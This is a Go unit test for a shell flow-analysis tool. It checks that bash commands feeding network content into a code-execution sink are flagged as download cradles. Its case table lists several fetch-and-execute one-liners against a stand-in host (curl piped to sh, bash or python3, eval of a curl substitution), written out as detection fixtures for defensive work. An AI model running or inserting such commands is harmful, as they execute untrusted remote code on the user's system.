package bash_test

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
	"github.com/v0lka/flowsh/front/bash"
)

// hasCradle reports whether the result carries a CodeExec sink marked as reached
// by network content.
func hasCradle(res *bash.ExecResult) bool {
	for _, e := range res.Effects {
		if e.NetFlow == engine.FlowCradle {
			return e.Kind == engine.KindCodeExec
		}
	}
	return false
}

// TestExecCradleMarking pins the frontend half of the download-cradle flow: a
// code-execution sink fed by network content is marked FlowCradle, and a sink
// that consumes only local data is not. The flow is established from the
// pipeline's value flow and from the provenance of the sink's arguments (a
// command substitution), not from the mere co-occurrence of an egress and a
// sink.
func TestExecCradleMarking(t *testing.T) {
	r := newResolver(t)
	cases := []struct {
		src  string
		want bool
	}{
		{`curl -sL https://evil.example/x | sh`, true},
		{`curl -sL https://evil.example/x | bash`, true},
		{`curl -sL https://evil.example/x | python3`, true},
		{`sh -c "$(curl -s https://evil.example/x)"`, true},
		{`bash <(curl -s https://evil.example/x)`, true},
		{`eval "$(curl -s https://evil.example/x)"`, true},
		{`curl -sL https://evil.example/x | head`, false}, // no code-execution sink
		{`echo hi | sh`, false},                           // local producer, no network
		{`sh -c "echo hi"`, false},                        // literal argument, no network
		{`curl -sL https://evil.example/x`, false},        // egress alone: not a flow
	}
	for _, tc := range cases {
		res := bash.ExecBash(tc.src, r)
		if got := hasCradle(res); got != tc.want {
			t.Errorf("%q: cradle=%v, want %v (effects=%v)", tc.src, got, tc.want, effectKeys(res))
		}
	}
}
